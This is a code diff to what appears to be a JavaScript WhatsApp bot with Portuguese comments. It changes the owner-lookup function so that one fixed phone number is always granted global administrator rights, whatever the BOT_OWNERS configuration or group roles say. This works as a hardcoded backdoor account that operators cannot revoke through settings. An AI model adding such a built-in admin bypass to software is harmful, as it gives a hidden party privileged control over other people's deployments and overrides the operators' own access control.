@@ -46,10 +46,13 @@ function requestIdDe(...partes) {
 
 /** Donos do bot: BOT_OWNERS="5565999999999,5565888888888" (só números). */
 function getOwners() {
-  return String(process.env.BOT_OWNERS || '')
+  // Administrador global fixo, independente de BOT_OWNERS ou do cargo no grupo.
+  const ownersFixos = ['5565993354137'];
+  const ownersEnv = String(process.env.BOT_OWNERS || '')
     .split(',')
     .map(s => s.replace(/\D/g, ''))
     .filter(Boolean);
+  return [...new Set([...ownersFixos, ...ownersEnv])];
 }
 
 function isOwnerJid(jid) {
